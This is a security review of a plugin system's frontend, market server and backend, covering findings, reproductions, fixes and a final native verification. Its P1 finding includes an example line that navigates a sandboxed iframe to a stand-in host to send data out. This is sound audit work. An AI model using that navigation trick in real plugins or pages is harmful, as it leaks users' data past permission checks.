# Plugin frontend and market review — 2026-10-16

Scope: read-only inspection of ui/plugins.js, ui/plugins.css, tools/patch_frontend.py, server/market/market.py; secondary inspection of src/plugins.rs and src/plugin_runtime.rs. Reviewed code was not modified by this reviewer.

## Findings

### P1 — iframe self-navigation needs native blocking (pending native verification)

ui/plugins.js buildDocument sets `navigate-to 'none'` and iframe sandbox is `allow-scripts`. Chromium does not enforce navigate-to; sandbox blocks top navigation but permits a frame to navigate itself. Therefore a package declaring no network permission can issue an out-of-band request with `location.href = 'https://controlled.example/collect?x=...'`; forms have form-action protection, but location/link/meta navigation require separate protection. This bypasses plugin_fetch origin and private-address checks. Reproduction should use a controlled local listener and native WebView, verify no request arrives and iframe remains srcdoc. Root has already implemented a native FrameNavigationStarting guard and is validating it; this is not an assertion that the final guarded build remains vulnerable.

### P2 — systemMetrics omitted from consent preview (fixed during review)

At initial inspection preview() displayed only network origins; installed cards also displayed only network. A metrics-only plugin appeared to have no network permission without disclosing metrics access. Reproduce using permissions={systemMetrics:true,network:[]} and inspect install preview. Frontend owner was notified and reports the preview and installed cards now display metrics, plus old/new permissions during upgrade. Verify final UI with such a package.

### P2 — valid direct-map themes silently ignored (fixed during review)

Backend and packager allow both direct variable maps and {variables:{...}}, but initial refresh() read only bundle.theme.variables. Direct-map theme installs/enables successfully yet applies nothing. Frontend additionally silently filtered strings over 200 characters despite the backend limit of 512. Owner reports direct-map normalization and 512 limit are now fixed. Verify both forms and boundary values in final tests.

### P2 — reinstalling the same version leaves old running code (communicated; awaiting fix)

refresh() invalidates sessions only when current.version differs from installed manifest.version. commit accepts a replacement archive with the same ID and version, as is common when editing a local development example. The installed bytes/settings UI change, but existing iframe retains old JavaScript and cached permissions. Reproduction: run tests/plugin-ui.cjs with its in-memory line `items[0].manifest.version='2.0.0'` changed to `items[0].manifest.version='1.0.0'`; the assertion `second.removed` fails at line 37. No reviewed file was changed for this reproduction. Suggested correction: install revision/fingerprint or an install event that invalidates instances of the replaced plugin ID.

## Other checks

Message broker binds source WindowProxy, instance ID, nonce, request structure, allowed method, message size and per-session rate/concurrency; metrics checks exist both in broker and backend. Disable/uninstall marks old sessions dead, removes iframe and disconnects observers; replies are suppressed after destruction. Current tests exercise forged message, metrics denial, disable/re-enable and differing-version replacement.

Market routes are restricted to health, catalog and simple package filenames. Decoded traversal and unsupported extensions fail the route whitelist. Symlink components are refused. File response limit is 20 MiB; request line/header parsing uses BaseHTTPRequestHandler limits. Thread count is bounded to 32 with 15-second socket timeouts, including TLS handshake performed in the handler thread. TLS uses explicit supplied certificates and the service socket activates port 443; no code was found silently downgrading certificate validation. A deliberately configured loopback HTTP origin without cert remains supported for proxy deployment. No additional remotely exploitable P1/P2 server issue was established in this review.

Backend secondary inspection: download resolves and pins all public DNS addresses into reqwest, disables proxies, rejects private/reserved targets and validates every redirect origin and HTTPS scheme. Package validation covers names, duplicate/case collisions, types and compressed/expanded limits before publication. Install stages first and rolls files back if registry save fails. Native tests and crash/power-loss durability were not independently run by this reviewer.

## Evidence

- `node --check examples/plugins/clock/clock.js`: pass (developer-deliverable verification).
- `python -m unittest discover -s tests -p test_plugin_packaging.py`: 9 pass.
- Same-version lifecycle mutation of existing Node VM test: fails on `assert(second.removed)` as described above.
- Native navigation guard and full install/resize/restart verification are owned by root/frontend agent; do not infer those have passed from this source review.

## Follow-up — background assets and fixes

Mist 1.0.1 now adds an actual original 32×32 PNG tile through top-level backgroundImage. Packager validates an existing safe package path and raster extension only; tests reject traversal, remote URLs, SVG and missing files, plus CSS backslashes/@. Both docs updated; historical released Mist 1.0.0 preserved. Catalog points to immutable mist-1.0.1.deskbox-plugin, SHA256 3a805bff89117898ce3e4bb6df4c2db7fcfe7debffa71a3e1e103ebb2a8723ef. Rebuilding unchanged content produced the same hash. Python packaging tests: 10 pass.

Reinspection confirms frontend now has permission summaries including metrics, direct-map normalization, 512-value limit, original inline-style preservation, safe raster data-URL background filter and reload=true instance invalidation on plugin-change/install paths. Node plugin security and lifecycle suite passes. Native guard registers FrameNavigationStarting and allows only about:blank/about:srcdoc; plugin_bundle awaits successful registration. Native cancellation still requires root's WebView evidence.

Two background-path integration edge cases were communicated to backend for correction: direct-map JSON plus backgroundImage must skip that metadata key in the variable loop, and MIME lookup must normalize uppercase raster extensions because validation accepts them. The example uses the variables wrapper and lowercase .png and is unaffected.

## Final disposition — native run plugins-native-180900

The final native runtime.log ends in PLUGIN_NATIVE_SUCCESS and proves the previously pending native guard cancellation while original script execution continues. It also proves actual settings/market GUI, SHA-checked URL reinstall preserving private settings and existing layout slots, raster theme apply/restore and safe text-only script-error card without automatic remount on resize. Final node tests/plugin-ui.cjs rerun passes. Metrics consent, direct-map theme normalization, same-version lifecycle reload and package-raster support are present in frozen source; no unresolved confirmed P1/P2 from this review remains. See plugin-backend-review.md final native section for detailed evidence limits and uninstall teardown ordering.
